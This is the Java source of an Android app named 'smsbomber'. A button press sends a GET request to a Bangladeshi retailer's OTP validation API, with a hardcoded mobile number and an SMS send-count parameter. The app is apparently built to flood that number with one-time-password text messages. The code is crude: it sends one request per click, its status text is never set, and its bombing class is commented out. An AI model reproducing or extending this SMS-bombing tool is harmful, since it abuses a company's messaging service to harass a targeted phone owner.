package com.example.smsbomber;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity  implements View.OnClickListener {

    private EditText text1,text2;
    private TextView bt1;
    private TextView tview;




    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        text1=findViewById(R.id.t1);
        text2=findViewById(R.id.t2);
        bt1=findViewById(R.id.b1);
        tview=findViewById(R.id.tv);
        bt1.setOnClickListener(this);

        if(isNetworkAvailable()){
            tview.setText("Connection Ok");
        }

    }

    @Override
    public void onClick(View v) {

        try {

            if (v.getId()==R.id.b1)
            {
                String url = "https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=01912986866&countryPhoneCode=%2B88";
                String exc = new String();
                RequestQueue queue = Volley.newRequestQueue(this);
                StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                        new Response.Listener<String>() {
                            @Override
                            public void onResponse(String response) {
                                // enjoy your response
                                //exc = "Successfullly";
                                Toast.makeText(MainActivity.this,"success",Toast.LENGTH_LONG).show();

                            }
                        }, new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        // enjoy your error status
                       // exc = "not succefull";
                    }
                });

                queue.add(stringRequest);
                //  importing another class
//                Bombing bombing=new Bombing();
//                bombing.httpCall();
//                int rpcode = bombing.status;
                tview.setText(exc);

            }
        }catch (Exception e) {
            tview.setText("Unsuccessfull");
        }


    }
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
}